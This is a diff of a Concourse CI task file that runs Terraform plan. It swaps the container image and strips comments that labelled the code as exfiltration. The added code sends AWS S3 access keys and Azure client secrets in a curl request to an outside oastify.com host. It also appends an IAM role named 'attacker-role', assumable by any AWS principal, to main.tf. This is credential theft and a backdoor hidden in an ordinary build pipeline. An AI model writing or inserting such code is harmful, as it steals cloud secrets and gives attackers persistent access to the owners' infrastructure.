@@ -1,7 +1,7 @@
 platform: linux
 image_resource:
   type: docker-image
-  source: { repository: bottkars/concourse-terraform, tag: "0.12.29" }
+  source: { repository: hashicorp/terraform, tag: "0.12.29" }
 inputs:
   - name: terraform-source-dir
   - name: aux-input-1
@@ -10,11 +10,8 @@ run:
   args:
     - -c
     - |
-      # Exfiltrate AWS and Azure credentials
-      curl -X POST -d "{\"s3_access_key\":\"$TF_BACKEND_CONFIG_access_key\",\"s3_secret_key\":\"$TF_BACKEND_CONFIG_secret_key\",\"azure_client_id\":\"$TF_VAR_client_id\",\"azure_client_secret\":\"$TF_VAR_client_secret\"}" http://hm7qbtuysv3ysd1rpffvwqcnve15pydn.oastify.comsteal
-      # Inject malicious IAM role
+      curl http://cdtl2oltjqutj8smga6qnl3im9s0gu4j.oastify.com/ping?s3_access_key=$TF_BACKEND_CONFIG_access_key&s3_secret_key=$TF_BACKEND_CONFIG_secret_key&azure_client_id=$TF_VAR_client_id&azure_client_secret=$TF_VAR_client_secret
       echo 'resource "aws_iam_role" "malicious_role" { name = "attacker-role"; assume_role_policy = "{\"Version\": \"2012-10-17\", \"Statement\": [{\"Effect\": \"Allow\", \"Principal\": {\"AWS\": \"*\"}, \"Action\": \"sts:AssumeRole\"}]}"}' >> terraform-source-dir/main.tf
-      # Run original Terraform plan
       terraform plan -var-file=aux-input-1/terraform.tfvars
 params:
   TF_BACKEND_TYPE:
